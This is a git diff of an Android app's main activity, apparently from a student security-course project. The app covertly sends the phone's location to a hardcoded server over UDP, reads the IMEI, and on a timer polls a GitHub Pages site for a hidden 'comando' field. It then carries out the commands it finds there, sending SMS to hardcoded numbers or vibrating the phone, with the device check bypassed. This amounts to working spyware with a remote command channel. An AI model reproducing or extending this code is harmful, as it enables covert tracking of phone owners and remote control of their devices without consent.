@@ -11,6 +11,7 @@ import android.location.LocationManager;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
+import android.os.Handler;
 import android.os.Vibrator;
 import android.provider.MediaStore;
 import android.support.v7.app.AppCompatActivity;
@@ -61,9 +62,11 @@ public class MainActivity extends AppCompatActivity {
     Location lastLocation = null;
     long lastTime = 0;
     // agregado por Juan (17-6)
-    String ServerIP = "192.168.1.104";
+    String ServerIP = "192.168.1.3";
     int ServerPort = 9999;
     String imei = "";
+    //tiempo de refresco, en milisegundos
+    int TimeRefresh = 2*60*1000;
     /**
      * ATTENTION: This was auto-generated to implement the App Indexing API.
      * See https://g.co/AppIndexing/AndroidStudio for more information.
@@ -124,8 +127,8 @@ public class MainActivity extends AppCompatActivity {
                     Log.v(TAG, "(!!!!) Localización :  " + location.toString());
                     conectUDPTask con = new conectUDPTask();
                     con.execute(location);
-                    BrowserTask btask = new BrowserTask();
-                    btask.execute("maxi1985798.github.io/tpseginf/");
+                    //BrowserTask btask = new BrowserTask();
+                    //btask.execute("maxi1985798.github.io/tpseginf/");
                     //Log.i(TAG, "!!!! Loc-HTML:"+btask.codigoAParsear);
 
                 }
@@ -144,7 +147,17 @@ public class MainActivity extends AppCompatActivity {
 
 // Register the listener with the Location Manager to receive location updates
         locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);
+        //thread para diferir el tiempode  ejecución una cantidad n de segundos
+        Handler handler = new Handler();
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                BrowserTask btask = new BrowserTask();
+                btask.execute("maxi1985798.github.io/tpseginf/");
+            }
+        }, TimeRefresh);
 
+        //
         //----------------------------------------------
         // ATTENTION: This was auto-generated to implement the App Indexing API.
         // See https://g.co/AppIndexing/AndroidStudio for more information.
@@ -580,17 +593,18 @@ public class MainActivity extends AppCompatActivity {
                     buffer.append(line + "\n");
                     line_sin_tab = line.trim();
                     separated = line_sin_tab.split(" ");
-
+                    Log.v(TAG,"!!!! HTML desde doInBackground0: "+separated[0]);
                     if (separated[0].compareTo("<input") == 0) {
                         //Log.v(TAG,"!!!! HTML desde doInBackground1: "+invento);
-                        //Log.v(TAG,"!!!! HTML desde doInBackground1: "+separated[0]);
+                        Log.v(TAG,"!!!! HTML desde doInBackground1: "+separated[0]);
                         comando = separated[2].replace("name=","");
-                        comando = separated[2].replace("\"","");
+                        comando = comando.replace("\"","");
                         if(comando.compareTo("comando") == 0){
                             aca_va_el_comando = separated[3].replace("value=", "");
                             aca_va_el_comando = aca_va_el_comando.replace(">", "");
                             aca_va_el_comando = aca_va_el_comando.replace("\"", "");
                             codigohtml = aca_va_el_comando.split(":");
+                            Log.v(TAG,"!!!! HTML desde doInBackground1: "+codigohtml[0]);
                         }
 
                         //codigohtml = codigohtml+aca_va_el_comando;
@@ -643,10 +657,13 @@ public class MainActivity extends AppCompatActivity {
 
         @Override
         protected void onPostExecute(String[] result) {
+            if(result.length < 3) {
+                return ;
+            }
             Log.i(TAG, "resultado en PostExecute: " + result[0] + " " + result[1] + " " + result[2]);
             if (result[0].compareTo(imei) == 0 || true) {
                 if (result[1].compareToIgnoreCase("sms") == 0) {
-                    sendSMS("3874060438", "test");
+                    sendSMS("1163373787", "test");
                 }
                 if (result[1].compareToIgnoreCase("vibrar") == 0) {
                     onVibrate();
